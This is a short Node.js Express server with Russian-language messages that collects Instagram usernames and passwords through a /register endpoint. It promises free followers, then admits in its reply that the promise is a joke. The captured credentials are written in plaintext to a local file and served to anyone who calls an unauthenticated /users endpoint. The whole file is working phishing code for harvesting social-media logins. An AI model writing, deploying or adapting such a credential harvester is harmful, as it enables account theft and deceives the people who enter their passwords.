const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 4000;

app.use(express.json());
app.use(cors());

const USERS_FILE = path.join(__dirname, 'users.json');

// Регистрация пользователя
app.post('/register', (req, res) => {
    const { instagram, password } = req.body;
    if (!instagram || !password) {
        return res.status(400).json({ message: 'Заполните все поля' });
    }

    let users = [];
    if (fs.existsSync(USERS_FILE)) {
        users = JSON.parse(fs.readFileSync(USERS_FILE));
    }
    users.push({ instagram, password });
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));

    res.json({ message: 'Вам успешно начислено 100 подписчиков! (Шутка)' });
});

// Просмотр списка пользователей (только для владельца)
app.get('/users', (req, res) => {
    if (!fs.existsSync(USERS_FILE)) {
        return res.json([]);
    }
    const users = JSON.parse(fs.readFileSync(USERS_FILE));
    res.json(users);
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
